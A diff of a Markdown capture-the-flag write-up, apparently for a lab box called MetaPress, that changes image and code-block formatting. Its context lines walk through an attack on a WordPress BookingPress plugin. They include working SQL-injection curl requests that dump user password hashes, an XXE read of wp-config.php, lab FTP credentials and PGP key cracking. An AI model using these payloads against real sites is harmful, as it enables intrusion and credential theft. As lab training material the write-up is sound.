@@ -22,7 +22,7 @@ FTP doesn't support anonymous logins, so let's move on to port 80. We have to ad
 
 The website was a blog of some sorts:
 
-<figure><img src="../../../.gitbook/assets/image (2371).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2371).png>)
 
 Reading a bit of the page source reveals this is a Wordpress site, so let's use `wpscan` with the API token to enumerate plugins and the version.
 
@@ -46,7 +46,7 @@ This was the main exploit I found interesting because the version running on `me
 
 While clicking on the URL within the blog post, I noticed that it was using a certain plugin.
 
-<figure><img src="../../../.gitbook/assets/image (2473).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2473).png>)
 
 This is a plugin that has a lot of vulnerabilities:
 
@@ -89,7 +89,6 @@ Referrer-Policy: strict-origin-when-cross-origin
 
 It seems that the `wpnonce` variable is incorrectly set. After changing it to a relevant one, we get confirmation that this works:
 
-{% code overflow="wrap" %}
 ```
 $ curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' \
   --data 'action=bookingpress_front_get_category_services&_wpnonce=75eb04a260&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -'
@@ -109,11 +108,9 @@ Referrer-Policy: strict-origin-when-cross-origin
 
 [{"bookingpress_service_id":"10.5.15-MariaDB-0+deb11u1","bookingpress_category_id":"Debian 11","bookingpress_service_name":"debian-linux-gnu","bookingpress_service_price":"$1.00","bookingpress_service_duration_val":"2","bookingpress_service_duration_unit":"3","bookingpress_service_description":"4","bookingpress_service_position":"5","bookingpress_servicedate_created":"6","service_price_without_currency":1,"img_url":"http:\/\/metapress.htb\/wp-content\/plugins\/bookingpress-appointment-booking\/images\/placeholder-img.jpg"}] 
 ```
-{% endcode %}
 
 With this, we can retrieve the user hashes:
 
-{% code overflow="wrap" %}
 ```
 $ curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' \
   --data 'action=bookingpress_front_get_category_services&_wpnonce=75eb04a260&category_id=33&total_service=-7502) UNION ALL SELECT group_concat(user_login), group_concat(user_pass), @@version_compile_os,1,2,3,4,5,6 from wp_users-- -'
@@ -133,11 +130,10 @@ Referrer-Policy: strict-origin-when-cross-origin
 
 [{"bookingpress_service_id":"admin,manager","bookingpress_category_id":"$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.,$P$B4aNM28N0E.tMy\/JIcnVMZbGcU16Q70", <TRUNCATED>
 ```
-{% endcode %}
 
 There were 2 hashes, and one of them could be cracked.
 
-<figure><img src="../../../.gitbook/assets/image (2485).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2485).png>)
 
 Now that we have credentials, we can run the authenticated XXE injection.
 
@@ -147,7 +143,7 @@ How this exploit works is by using the credentails to make the Wordpress site re
 
 Following the PoC from the repo above, I was able to replicate it.
 
-<figure><img src="../../../.gitbook/assets/image (3745).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3745).png>)
 
 Using this `.dtd` file, we can grab the `wp-config.php` file:
 
@@ -158,7 +154,7 @@ Using this `.dtd` file, we can grab the `wp-config.php` file:
 
 Within that file, we can find FTP credentials:
 
-<figure><img src="../../../.gitbook/assets/image (942).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(942).png>)
 
 We can login to FTP using `metapress.htb:9NYS_ii@FyL_p5M2NvJ`.
 
@@ -197,7 +193,7 @@ $mail->Port = 587;
 
 With these credentials, we can `ssh` in as `jnelson`.
 
-<figure><img src="../../../.gitbook/assets/image (3508).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3508).png>)
 
 ## Privilege Escalation
 
@@ -240,8 +236,8 @@ dr-xr-x--- 3 jnelson jnelson 4096 Oct 25  2022 ..
 
 The `.keys` directory contains a PGP key pair, which I'm assuming is used to decrypt the `root.pass` file. I took the private key from the `.keys` file, and cracked it using `gpg2john` > `john`.
 
-<figure><img src="../../../.gitbook/assets/image (2391).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2391).png>)
 
 With this password, we can decrypt the `root.pass` file:
 
-<figure><img src="../../../.gitbook/assets/image (1447).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1447).png>)
